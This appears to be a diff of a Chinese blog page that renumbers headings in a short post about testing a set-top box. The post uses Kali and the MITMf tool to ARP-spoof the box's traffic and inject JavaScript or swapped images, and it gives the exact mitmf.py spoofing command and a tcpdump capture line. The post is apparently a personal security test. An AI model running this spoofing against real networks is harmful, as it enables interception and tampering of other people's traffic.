@@ -89,7 +89,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#测试步骤"><span class="toc-text">测试步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#关键命令"><span class="toc-text">关键命令</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1、测试步骤"><span class="toc-text">1、测试步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2、关键命令"><span class="toc-text">2、关键命令</span></a></li></ol>
 </div>
     
 </div>
@@ -141,7 +141,7 @@
 </span>
     </div>
     <div class="post-content ">
-        <h1 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h1><ol>
+        <h1 id="1、测试步骤"><a href="#1、测试步骤" class="headerlink" title="1、测试步骤"></a>1、测试步骤</h1><ol>
 <li><p>安装VirtualBox；</p>
 </li>
 <li><p>安装kaili系统<br>在VirtualBox新建一台虚拟机，安装kali操作系统</p>
@@ -150,12 +150,12 @@
 <li><p>安装MITMf工具<br>在kali系统中安装MITMf工具</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/byt3bl33d3r/MITMf/blob/master/README.md</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>开始测试<br>使用MITMF工具里的Spoof模块的arp攻击劫持机顶盒流量，再用Inject模块向返回的HTML页面注入JS代码或者跳转；<br>可参考:</p>
+<li><p>开始测试<br>使用MITMF工具里的Spoof模块的arp攻击劫持机顶盒流量，再用Inject模块向返回的HTML页面注入JS代码或者跳转；可参考:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.361doc.com/content/17/0123/17/33093582_624375844.shtml</span><br></pre></td></tr></table></figure>
 
 </li>
 </ol>
-<h1 id="关键命令"><a href="#关键命令" class="headerlink" title="关键命令"></a>关键命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/bin/MITMf/</span><br><span class="line">python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.13 --imgrand --img-dir /home</span><br></pre></td></tr></table></figure>
+<h1 id="2、关键命令"><a href="#2、关键命令" class="headerlink" title="2、关键命令"></a>2、关键命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/bin/MITMf/</span><br><span class="line">python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.13 --imgrand --img-dir /home</span><br></pre></td></tr></table></figure>
 
 <p>这个命令可以替换HTTP流量里的图片（图片文件放到/home），但是会把所有图片换掉，随机替换，无法指定。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 ip host 192.168.1.13</span><br></pre></td></tr></table></figure>
@@ -168,8 +168,25 @@
         </div>
         <div id="disqus_thread"></div>
 
-        <div id="lv-container">
-        </div>
+        <!-- LiveRe City install code -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80NjE1OS8yMjY3MA==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+    </script>
+<noscript> Please activate JavaScript for write a comment in LiveRe</noscript>
+</div>
+<!-- completed City install code -->
+
 
     </div>
 </div>
